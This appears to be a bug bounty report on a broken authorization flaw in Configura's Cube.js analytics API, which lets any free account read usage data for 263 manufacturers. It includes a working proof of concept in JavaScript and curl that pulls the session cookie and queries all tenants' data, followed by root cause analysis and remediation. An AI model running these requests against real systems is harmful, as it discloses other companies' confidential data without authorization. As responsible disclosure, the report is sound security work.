# Broken Access Control — Analytics Cube API discloses every manufacturer's data to any free MyConfigura account

| | |
|---|---|
| **Program** | Configura Security Bug Bounty Program (Xposera) |
| **Scope asset** | `*.configura.com` (in scope) |
| **Affected host** | `https://api.analytics.configura.com` (Analytics / Cube.js API), reached from `https://analytics.configura.com` |
| **Vulnerability** | Broken Object-/Function-Level Authorization — missing row-level tenant scope on the Cube query layer |
| **Weakness** | CWE-285 (Improper Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **Severity** | **High — CVSS 3.1 7.7** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
| **Tester account** | hg266087+testaccount2@gmail.com (uid 490244) — a standard, free MyConfigura user with **no** manufacturer affiliation |
| **Date** | 2026-10-08 |

---

## 1. Summary

The Manufacturer/Extension Analytics product (`analytics.configura.com`) is served by a Cube.js API at
`https://api.analytics.configura.com`. Each manufacturer's analytics are supposed to be visible only
to users affiliated with that manufacturer. The per-user access token issued by `/auth/cube-token`
encodes exactly that: the caller's authorized manufacturers in the JWT claims `base_manufacturer_ids`,
`extension_manufacturer_ids` and `product_manufacturer_ids`.

That authorization is enforced **in the UI and in the REST endpoints**, but **not in the Cube query
layer**. `GET /api/v1/cube/meta` and `GET /api/v1/cube/load` ignore the token's manufacturer scope and
return data for **all** manufacturers.

Using a free, unaffiliated MyConfigura account — whose analytics token is scoped to **zero**
manufacturers, and for whom the dashboard explicitly refuses to load ("*Access not authorized!…Unable
to load manufacturers*") — I retrieved per-manufacturer usage analytics for **263 distinct
manufacturers**. The same unscoped token also reaches the other 18 cubes in the schema (product/spec
configuration activity, stability and new-bug metrics, user locations, and a per-`user_id` dimension).

## 2. Impact

- **Cross-tenant disclosure of confidential business intelligence.** Anyone who can register a free
  MyConfigura account can read every manufacturer's active-user counts and quarter-over-quarter usage.
  For Configura's paying manufacturer customers, installed-base and growth figures are sensitive
  competitive data — one manufacturer can quantify a direct competitor's user base.
- **Broad schema reach.** The same token returns `200` from `/api/v1/cube/meta` (full 19-cube schema)
  and can query cubes including `manufacturer_stability_percentile`, `manufacturer_new_bugs`,
  `extension_user_locations`, `cet_part_entries` and `spec_part_entries` (end-customer
  configuration/spec activity). These were confirmed **reachable**; I did not enumerate their contents.
- **Row-level / personal data.** The `manufacturer_users` cube exposes a `user_id` dimension, so the
  exposure is not limited to aggregates. I deliberately did **not** pull user-level rows.

## 3. Pre-conditions

- One free, self-service MyConfigura account. No manufacturer affiliation and no special role — the
  token used below is `roles:["user"]` with all three manufacturer-scope arrays empty.

## 4. Proof of Concept

All requests target the in-scope host `api.analytics.configura.com`. Two auth facts matter:

- REST endpoints `/api/v1/*` authenticate with the **MyConfigura session** value as the Bearer token.
- Cube endpoints `/api/v1/cube/*` authenticate with the **cube token** from `/auth/cube-token`.

### 4.1 Browser-console PoC (simplest — run on `https://analytics.configura.com` while logged in)

```js
const A = 'https://api.analytics.configura.com';
const session = document.cookie.match(/myconfigura-session=([^;]+)/)[1];

// (1) Get the analytics token and show its scope is EMPTY
const { token } = await (await fetch(A + '/auth/cube-token',
  { headers: { Authorization: 'Bearer ' + session } })).json();
const claims = JSON.parse(atob(token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
console.log('scope:', claims.roles, claims.base_manufacturer_ids,
            claims.extension_manufacturer_ids, claims.product_manufacturer_ids);
// -> ["user"] [] [] []   (authorized for ZERO manufacturers)

// (2) CONTROL — the REST layer correctly enforces scope
for (const p of ['/api/v1/users/1/subscriptions',
                 '/api/v1/manufacturer/10093/query-presets']) {
  const r = await fetch(A + p, { headers: { Authorization: 'Bearer ' + session } });
  console.log('REST', p, '->', r.status);            // -> 403
}

// (3) VULN — the Cube layer does NOT. Pull every manufacturer's usage.
const q = { measures:   ['manufacturer_users.past_quarter_average'],
            dimensions: ['manufacturer_users.manufacturer_id'], limit: 5000 };
const r = await fetch(A + '/api/v1/cube/load?query='
            + encodeURIComponent(JSON.stringify(q)) + '&queryType=multi',
            { headers: { Authorization: 'Bearer ' + token } });
const data = (await r.json()).results[0].data;        // HTTP 200
console.log('distinct manufacturers:',
            new Set(data.map(x => x['manufacturer_users.manufacturer_id'])).size); // -> 263
```

### 4.2 `curl` equivalent

```bash
# SESSION = value of the (non-HttpOnly) myconfigura-session cookie from a logged-in browser
A=https://api.analytics.configura.com

# (1) analytics token (its manufacturer-scope arrays are empty)
TOKEN=$(curl -s "$A/auth/cube-token" -H "Authorization: Bearer $SESSION" | jq -r .token)

# (2) CONTROL — REST enforces scope
curl -s -o /dev/null -w '%{http_code}\n' "$A/api/v1/users/1/subscriptions"            -H "Authorization: Bearer $SESSION"   # 403
curl -s -o /dev/null -w '%{http_code}\n' "$A/api/v1/manufacturer/10093/query-presets" -H "Authorization: Bearer $SESSION"   # 403

# (3) VULN — Cube does not: returns all manufacturers
Q='{"measures":["manufacturer_users.past_quarter_average"],"dimensions":["manufacturer_users.manufacturer_id"],"limit":5000}'
curl -s -G "$A/api/v1/cube/load" --data-urlencode "query=$Q" --data-urlencode "queryType=multi" \
  -H "Authorization: Bearer $TOKEN" \
  | jq '[.results[0].data[]."manufacturer_users.manufacturer_id"] | unique | length'   # -> 263
```

### 4.3 Observed result (evidence transcript `12-analytics-cube-evidence.txt`)

```
[1] GET /auth/cube-token                                     -> 200
    scope: roles=["user"]  base_manufacturer_ids=[]  extension_manufacturer_ids=[]  product_manufacturer_ids=[]
[2] CONTROL (session bearer):
    GET /api/v1/users/490244/subscriptions        (own)        -> 200  {"subscriptions":[]}
    GET /api/v1/users/1/subscriptions             (other user) -> 403  {"message":"Forbidden"}
    GET /api/v1/manufacturer/10093/query-presets  (unaffil.)   -> 403  {"message":"Forbidden"}
[3] GET /api/v1/cube/meta                          (cube token) -> 200  (19 cubes disclosed)
[4] GET /api/v1/cube/load  manufacturer_users...   (cube token) -> 200
    DISTINCT manufacturers returned = 263          (tester is affiliated with 0)
    e.g.  manufacturer_id 1 -> 17033 ,  14 -> 6889 ,  70 -> 5361
```

## 5. Evidence files

- `evidence/10-analytics-ui-access-not-authorized.jpg` — the dashboard refuses to load for this
  account ("Access not authorized! … Unable to load manufacturers"), establishing the intended
  boundary.
- `evidence/11-analytics-cube-authz-proof.jpg` — side-by-side proof: empty-scope token + REST `403`
  controls + Cube `200` returning 263 manufacturers.
- `evidence/12-analytics-cube-evidence.txt` — full request/response transcript.

## 6. Root cause

The Cube.js security context derived from the JWT (the `*_manufacturer_ids` claims) is not applied as
a mandatory row-level filter (`queryRewrite`) on `/api/v1/cube/load`, and the schema is not scoped on
`/api/v1/cube/meta`. Authorization was implemented in the REST handlers and the front end but omitted
from the Cube query endpoints, so an empty/narrow scope is silently treated as "no restriction"
instead of "no access."

## 7. Remediation

- Enforce the token's manufacturer scope on every Cube query via Cube's `queryRewrite` / security
  context: inject a mandatory filter
  `manufacturer_id ∈ (base_manufacturer_ids ∪ extension_manufacturer_ids ∪ product_manufacturer_ids)`
  on every cube that carries a manufacturer dimension, and **deny** (return no rows / `403`) when the
  resulting scope is empty.
- Apply the same scope to `/api/v1/cube/meta` so cube/measure/dimension names are not disclosed to
  unauthorized callers.
- Add a regression test: a token whose manufacturer arrays are empty must receive `403` (or an empty
  result set) from `/api/v1/cube/load` for any manufacturer-scoped query.

## 8. Severity justification (CVSS 3.1)

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7 (High)**

- **PR:L** — a free self-service account is required, but no affiliation or privilege.
- **S:C** — the vulnerable component (the caller's own analytics authority) is used to read data
  belonging to other tenants (every other manufacturer), crossing a security/authorization boundary.
- **C:H** — confidential cross-tenant business data (and reachable personal/config data) is disclosed.
- **I:N / A:N** — read-only; no integrity or availability impact demonstrated.

## 9. Testing notes / responsible handling

- Testing used only the tester's own free account against the in-scope host
  `api.analytics.configura.com`.
- To avoid collecting third parties' business data and any personal data, extraction was limited to
  what proves the authorization boundary is missing: the token claims, the distinct **count** of
  manufacturers (263), and three aggregate sample rows. The `user_id` dimension and the
  part/spec/location cubes were **not** enumerated.
